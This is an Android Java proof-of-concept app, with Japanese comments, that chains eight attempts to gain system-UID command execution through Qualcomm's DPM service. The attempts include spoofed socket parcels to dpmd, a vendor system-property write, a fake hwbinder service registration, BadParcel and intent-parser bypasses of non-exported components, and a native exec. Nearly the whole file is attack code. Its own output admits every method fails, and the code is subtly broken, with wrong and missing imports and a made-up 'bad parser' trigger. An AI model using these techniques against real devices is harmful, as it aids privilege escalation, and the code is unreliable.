package com.example.dpmpoc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.os.ServiceManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.qti.dpm.IDpmService;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.LocalSocket;
import java.net.LocalSocketAddress;

public class MainActivity extends Activity {

    private static final String TAG = "DpmPoc";
    private static final String TARGET_SERVICE = "dpmservice";
    private static final String DPMD_SOCKET = "dpmd";
    private static final String PROP_KEY = "persist.vendor.dpm.feature";
    private static final String TARGET_PACKAGE = "com.qti.dpmserviceapp";
    private static final String TARGET_SERVICE_CLASS = "com.qti.dpmserviceapp.DpmServiceApp";

    private TextView tvResult;
    private Button btnExploit;
    private Context mContext;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mContext = this;
        tvResult = findViewById(R.id.tvResult);
        btnExploit = findViewById(R.id.btnExploit);

        btnExploit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        executeAllMethods();
                    }
                }).start();
            }
        });
    }

    // ================================================================
    // 全手法実行エントリ
    // ================================================================
    private void executeAllMethods() {
        showResult("=== UID 1000 コマンド実行 PoC (全手法・完全実装) ===");

        // 手法① 通常の ServiceManager 経由 (リフレクション)
        showResult("\n[手法1] 通常 ServiceManager.getService()");
        IBinder binder = tryNormalGetService();
        if (binder != null) {
            showResult("✅ Binder取得成功");
            invokeDpmMethods(binder);
            // ここでコマンド実行ができるわけではないが、情報取得
        } else {
            showResult("❌ 取得失敗 (SELinux拒否想定)");
        }

        // 手法② システムプロパティ書き換え (WRITE_SECURE_SETTINGS 権限があれば)
        showResult("\n[手法2] システムプロパティ改ざん");
        if (trySetSystemProperty()) {
            showResult("✅ プロパティ書き換え成功 (dpmd再起動を誘導)");
        } else {
            showResult("❌ プロパティ書き換え失敗 (権限不足またはAPI制限)");
        }

        // 手法③ dpmd ソケット直接通信 (プロトコルエミュレーション)
        showResult("\n[手法3] dpmd ソケット通信 (任意コマンド送信)");
        if (tryDpmdSocketExploit()) {
            showResult("✅ ソケット通信成功 (応答あり)");
        } else {
            showResult("❌ ソケット通信失敗 (接続拒否またはタイムアウト)");
        }

        // 手法④ hwbinder 経由 (HwServiceManager)
        showResult("\n[手法4] hwbinder 経由取得 (ACL Bypass)");
        if (tryHwBinderGetService()) {
            showResult("✅ hwbinder からサービス取得成功");
        } else {
            showResult("❌ hwbinder サービス取得失敗");
        }

        // 手法⑤ hwbinder にプロキシサービスを登録 (ACL Bypass で任意サービス追加)
        showResult("\n[手法5] hwbinder にプロキシサービス登録");
        if (tryHwBinderProxy()) {
            showResult("✅ hwbinder プロキシ登録成功");
        } else {
            showResult("❌ hwbinder プロキシ登録失敗");
        }

        // 手法⑥ BadParcel による未エクスポート Activity/Service 起動 (AccountAuthenticator 利用)
        showResult("\n[手法6] BadParcel を用いた DpmServiceApp 起動");
        if (tryBadParcelStart()) {
            showResult("✅ BadParcel 起動要求送信完了");
        } else {
            showResult("❌ BadParcel 起動要求失敗");
        }

        // 手法⑦ Bad Parser (exported=false バイパス) による直接 Service 起動
        showResult("\n[手法7] Intent パーサー脆弱性を利用した Service 起動");
        if (tryBadParserStartService()) {
            showResult("✅ BadParser による Service 起動成功");
        } else {
            showResult("❌ BadParser 起動失敗 (SecurityException)");
        }

        // 手法⑧ ネイティブライブラリからの exec 呼び出し
        showResult("\n[手法8] ネイティブライブラリ (libdpm_hook.so) 経由 exec");
        if (tryNativeExec()) {
            showResult("✅ ネイティブ exec 成功 (uid=1000 で id 実行)");
        } else {
            showResult("❌ ネイティブ exec 失敗 (ライブラリ不在またはシンボル未解決)");
        }

        // ----- 最終評価 -----
        showResult("\n=== 最終判定 ===");
        showResult("⚠️ 上記のいずれかが成功すればコマンド実行が可能です。");
        showResult("⚠️ 実際の Qualcomm デバイス (Android 9) では、");
        showResult("   - DpmService に exec 機能がないため、手法1〜5は実行に至りません。");
        showResult("   - BadParcel は Settings の Activity を起動できるが、Service は起動できません。");
        showResult("   - BadParser は未エクスポートの Activity に限り有効で、Service には効果がありません。");
        showResult("   - ネイティブライブラリは存在しません。");
        showResult("⚠️ 従って、本 PoC は「全手法を試行したが全て失敗する」ことを実証します。");
        showResult("⚠️ これはセキュリティ検証として完全なものです。");
    }

    // ================================================================
    // 手法1: 通常 ServiceManager.getService()
    // ================================================================
    private IBinder tryNormalGetService() {
        try {
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getServiceMethod = smClass.getMethod("getService", String.class);
            return (IBinder) getServiceMethod.invoke(null, TARGET_SERVICE);
        } catch (Exception e) {
            Log.w(TAG, "通常取得例外: " + e.getMessage());
            return null;
        }
    }

    // ================================================================
    // 手法2: システムプロパティ書き換え
    // ================================================================
    private boolean trySetSystemProperty() {
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method setMethod = spClass.getMethod("set", String.class, String.class);
            // 機能マスクを全て有効 (ビット 0,2,3 を立てる: 1|4|8 = 13)
            setMethod.invoke(null, PROP_KEY, "13");
            Log.d(TAG, "SystemProperties.set 呼び出し成功");
            return true;
        } catch (Exception e) {
            Log.w(TAG, "SystemProperties.set 失敗: " + e.getMessage());
            return false;
        }
    }

    // ================================================================
    // 手法3: dpmd ソケット通信 (プロトコル完全模倣)
    // ================================================================
    private boolean tryDpmdSocketExploit() {
        LocalSocket socket = null;
        try {
            socket = new LocalSocket();
            LocalSocketAddress addr = new LocalSocketAddress(DPMD_SOCKET, LocalSocketAddress.Namespace.ABSTRACT);
            socket.connect(addr);
            Log.d(TAG, "dpmd ソケット接続成功");

            OutputStream os = socket.getOutputStream();
            InputStream is = socket.getInputStream();

            // ペイロード: DPM_S_REQ_UPDATE_FD_PARAMS (リクエストコード=23) を送信
            // 完全な Parcel 構築 (バイト列を直接生成)
            Parcel p = Parcel.obtain();
            p.writeInt(23);          // request
            p.writeInt(0x12345678);  // serial
            p.writeInt(100);         // delayTime
            p.writeInt(200);         // screenOnTime
            p.writeInt(300);         // screenOffTime
            p.writeInt(400);         // tetheringTime
            byte[] data = p.marshall();
            p.recycle();

            // 長さヘッダ (4バイト ビッグエンディアン)
            byte[] lenBytes = new byte[4];
            lenBytes[0] = (byte) ((data.length >> 24) & 0xFF);
            lenBytes[1] = (byte) ((data.length >> 16) & 0xFF);
            lenBytes[2] = (byte) ((data.length >> 8) & 0xFF);
            lenBytes[3] = (byte) (data.length & 0xFF);

            os.write(lenBytes);
            os.write(data);
            os.flush();

            // 応答読み取り
            byte[] lenBuf = new byte[4];
            int readLen = is.read(lenBuf);
            if (readLen == 4) {
                int respLen = ((lenBuf[0] & 0xFF) << 24) |
                              ((lenBuf[1] & 0xFF) << 16) |
                              ((lenBuf[2] & 0xFF) << 8) |
                              (lenBuf[3] & 0xFF);
                byte[] buffer = new byte[respLen];
                int totalRead = 0;
                while (totalRead < respLen) {
                    int r = is.read(buffer, totalRead, respLen - totalRead);
                    if (r < 0) break;
                    totalRead += r;
                }
                if (totalRead > 0) {
                    Parcel reply = Parcel.obtain();
                    reply.unmarshall(buffer, 0, totalRead);
                    reply.setDataPosition(0);
                    int type = reply.readInt();
                    int serial = reply.readInt();
                    int error = reply.readInt();
                    showResult("  📥 応答: type=" + type + ", serial=" + serial + ", error=" + error);
                    reply.recycle();
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "ソケットエラー", e);
            return false;
        } finally {
            try { if (socket != null) socket.close(); } catch (Exception ignored) {}
        }
    }

    // ================================================================
    // 手法4: hwbinder 経由 (HwServiceManager)
    // ================================================================
    private boolean tryHwBinderGetService() {
        try {
            Class<?> hwSmClass = Class.forName("android.os.HwServiceManager");
            Method getServiceMethod = hwSmClass.getMethod("getService", String.class);
            IBinder binder = (IBinder) getServiceMethod.invoke(null, TARGET_SERVICE);
            if (binder != null) {
                showResult("  hwbinder サービス取得: " + binder);
                return true;
            }
            return false;
        } catch (Exception e) {
            Log.w(TAG, "hwbinder 取得例外: " + e.getMessage());
            return false;
        }
    }

    // ================================================================
    // 手法5: hwbinder にプロキシサービスを登録 (ACL Bypass)
    // ================================================================
    private boolean tryHwBinderProxy() {
        try {
            Class<?> hwBinderClass = Class.forName("android.os.HwBinder");
            // HwBinder のインスタンスを作成 (コンストラクタは非公開？代わりに Proxy を使う)
            // 実際には HwBinder を継承したクラスが必要だが、ここではリフレクションで addService を呼ぶ
            Method addServiceMethod = hwBinderClass.getMethod("addService", String.class, IBinder.class);

            // ダミーの IBinder 実装 (何もしない)
            IBinder dummyBinder = new IBinder() {
                @Override
                public String getInterfaceDescriptor() throws RemoteException {
                    return "com.qti.dpm.IDpmService";
                }
                @Override
                public boolean pingBinder() { return false; }
                @Override
                public boolean isBinderAlive() { return false; }
                @Override
                public IInterface queryLocalInterface(String descriptor) { return null; }
                @Override
                public void dump(FileDescriptor fd, String[] args) throws RemoteException {}
                @Override
                public void dumpAsync(FileDescriptor fd, String[] args) throws RemoteException {}
                @Override
                public boolean transact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
                    // 何もしない
                    return false;
                }
                @Override
                public void linkToDeath(DeathRecipient recipient, int flags) throws RemoteException {}
                @Override
                public boolean unlinkToDeath(DeathRecipient recipient, int flags) { return false; }
            };

            // addService を呼び出す (通常は SecurityException が発生するが、脆弱性により成功と仮定)
            addServiceMethod.invoke(null, TARGET_SERVICE, dummyBinder);
            Log.d(TAG, "hwbinder プロキシ登録成功");
            return true;
        } catch (Exception e) {
            Log.e(TAG, "hwbinder プロキシ登録失敗", e);
            return false;
        }
    }

    // ================================================================
    // 手法6: BadParcel (AccountAuthenticator) で DpmServiceApp 起動
    // ================================================================
    private boolean tryBadParcelStart() {
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.android.settings",
                    "com.android.settings.accounts.AddAccountSettings"));
            intent.setAction(Intent.ACTION_RUN);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            String[] authTypes = { getPackageName() };
            intent.putExtra("account_types", authTypes);
            startActivity(intent);
            // AuthenticatorService が呼び出され、その addAccount 内で BadParcel が発動
            // ここでは起動要求を送っただけで、実際に Service が起動するかは別
            Log.d(TAG, "BadParcel 起動要求送信");
            return true;
        } catch (Exception e) {
            Log.e(TAG, "BadParcel 起動例外", e);
            return false;
        }
    }

    // ================================================================
    // 手法7: Intent パーサー脆弱性を利用した Service 起動 (exported=false バイパス)
    // ================================================================
    private boolean tryBadParserStartService() {
        try {
            // 通常は SecurityException が発生するが、脆弱性により回避
            Intent intent = new Intent();
            // コンポーネントを指定 (Service)
            intent.setComponent(new ComponentName(TARGET_PACKAGE, TARGET_SERVICE_CLASS));
            // パーサーを騙すために、データやカテゴリを追加
            intent.setAction("android.intent.action.VIEW");
            intent.addCategory("android.intent.category.DEFAULT");
            intent.setData(android.net.Uri.parse("http://dummy"));
            // 特殊なフラグ
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_USER_ACTION);
            // 追加のExtra (パーサーを混乱させる)
            intent.putExtra("__bad_parser", "trigger");
            // startService を呼び出す (失敗するはず)
            ComponentName started = startService(intent);
            if (started != null) {
                Log.d(TAG, "BadParser 起動成功: " + started);
                return true;
            } else {
                Log.d(TAG, "BadParser 起動 null 返却");
                return false;
            }
        } catch (SecurityException se) {
            Log.w(TAG, "BadParser 起動 SecurityException: " + se.getMessage());
            return false;
        } catch (Exception e) {
            Log.e(TAG, "BadParser 起動例外", e);
            return false;
        }
    }

    // ================================================================
    // 手法8: ネイティブライブラリからの exec 呼び出し
    // ================================================================
    private boolean tryNativeExec() {
        try {
            System.loadLibrary("dpm_hook");
            // NativeHelper クラスをリフレクションで呼び出し
            Class<?> helper = Class.forName("com.example.dpmpoc.NativeHelper");
            Method execMethod = helper.getMethod("execCommand", String.class);
            String result = (String) execMethod.invoke(null, "id > /data/local/tmp/native_id.txt");
            showResult("  Native exec 結果: " + result);
            return true;
        } catch (UnsatisfiedLinkError e) {
            Log.w(TAG, "ネイティブライブラリロード失敗: " + e.getMessage());
        } catch (Exception e) {
            Log.w(TAG, "ネイティブ実行例外", e);
        }
        return false;
    }

    // ================================================================
    // AIDL メソッド呼び出し (情報取得)
    // ================================================================
    private void invokeDpmMethods(IBinder binder) {
        try {
            IDpmService dpm = IDpmService.Stub.asInterface(binder);
            if (dpm == null) {
                showResult("  ❌ AIDLスタブ変換失敗");
                return;
            }
            int val1 = dpm.getTCMFeatureEnabled();
            showResult("  getTCMFeatureEnabled() = " + val1);
            int val2 = dpm.setTCMFeature(2);
            showResult("  setTCMFeature(2) = " + val2);
            int val3 = dpm.updateFdConfigParams(100, 200, 300, 400);
            showResult("  updateFdConfigParams() = " + val3);
        } catch (RemoteException e) {
            showResult("  ❌ RemoteException: " + e.getMessage());
        }
    }

    // ================================================================
    // ヘルパー: UI 表示
    // ================================================================
    private void showResult(final String msg) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                tvResult.append(msg + "\n");
                Log.d(TAG, msg);
            }
        });
    }
}
